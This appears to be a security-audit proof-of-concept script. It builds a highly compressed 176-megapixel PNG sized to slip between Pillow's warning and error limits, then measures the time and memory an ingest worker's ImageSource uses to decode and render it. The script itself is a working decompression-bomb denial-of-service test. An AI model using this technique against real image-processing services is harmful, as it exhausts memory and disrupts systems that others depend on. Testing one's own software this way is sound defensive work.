import io, sys, time, resource
from PIL import Image
w,h = 16000, 11000            # 176 MP: above Pillow's 100 MP warning line, below its 200 MP error line
if sys.argv[1] == "make":
    im = Image.new("RGB",(w,h),(200,30,30)); b = io.BytesIO(); im.save(b,"PNG",compress_level=9); open("/tmp/audit-poc/bomb.png","wb").write(b.getvalue()); print("png bytes:", len(b.getvalue())); sys.exit()
import warnings; warnings.simplefilter("ignore")
from sbam_workers.ingest.rasterize import ImageSource
data = open("/tmp/audit-poc/bomb.png","rb").read(); t=time.time()
s = ImageSource(data); print("opened/decoded first frame; pages =", s.pages, f"{time.time()-t:.1f}s peakRSS={resource.getrusage(resource.RUSAGE_SELF).ru_maxrss//1024}MB")
try:
    out = s.render(1); print("rendered ->", len(out), "bytes", f"{time.time()-t:.1f}s peakRSS={resource.getrusage(resource.RUSAGE_SELF).ru_maxrss//1024}MB")
except Exception as e: print("render:", type(e).__name__, e, f"peakRSS={resource.getrusage(resource.RUSAGE_SELF).ru_maxrss//1024}MB")
